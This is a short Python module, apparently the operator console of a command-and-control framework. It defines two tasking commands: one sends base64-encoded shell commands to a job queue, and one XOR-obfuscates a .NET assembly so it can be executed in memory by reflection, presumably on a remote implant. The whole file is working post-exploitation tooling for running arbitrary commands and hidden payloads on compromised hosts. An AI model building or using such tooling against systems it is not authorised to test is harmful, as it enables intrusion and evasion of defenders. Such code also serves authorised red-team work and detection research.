import argparse

from connect.convert import string_to_base64, bytes_to_base64, xor_base64
from cmd2 import Cmd, Cmd2ArgumentParser, CommandSet, with_argparser, with_default_category


@with_default_category('Execution')
class ExecutionCommands(CommandSet):
    """
    The execution command set.
    """

    def __init__(self, post_job):
        super().__init__()
        self.post_job = post_job

    """ 
    CMD Command 
    """

    cmd_parser = Cmd2ArgumentParser()
    cmd_parser.add_argument('command', help='Command to execute')

    @with_argparser(cmd_parser)
    def do_cmd(self, args: argparse.Namespace):
        """ Execute a command. """
        command = string_to_base64(args.command)
        self.post_job(f'"name":"cmd","arguments":"{command}","type":1')

    """
    Execute Assembly
    """

    execute_assembly_parser = Cmd2ArgumentParser()
    execute_assembly_parser.add_argument('assembly', completer=Cmd.path_complete, help='.NET assembly to execute')
    execute_assembly_parser.add_argument('args', nargs='*', help='arguments to the assembly', default='')

    @with_argparser(execute_assembly_parser)
    def do_execute_assembly(self, args: argparse.Namespace):
        """ Executes a .NET assembly with reflection """
        with open(args.assembly, 'rb') as fd:
            key, file = xor_base64(fd.read())
        arg_str = ''
        for arg in args.args:
            arg_str = arg_str + ',' + string_to_base64(arg)
        self.post_job(f'"name":"execute_assembly","arguments":"{key},{file}{arg_str}","type":1')